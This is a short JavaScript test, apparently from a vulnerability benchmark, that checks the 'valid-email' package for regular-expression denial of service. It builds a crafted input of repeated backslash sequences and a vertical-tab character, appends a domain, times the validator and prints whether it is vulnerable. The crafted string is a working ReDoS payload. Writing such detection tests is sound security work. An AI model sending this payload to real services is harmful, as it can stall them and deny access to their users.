// test("ReDos in valid-email", () => {
  const validate = require("valid-email");
  const measureTime = require("../utils").measureTime;
  var pump = "\\\\a\\\\\\a";
  var attackString = "";
  for (var i = 0; i < 9; i++) {
    attackString += pump;
  }
  attackString += "\x0B";
  var badEmail = `${attackString}@google.com`;
  let t = measureTime(function () {
    validate(badEmail);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
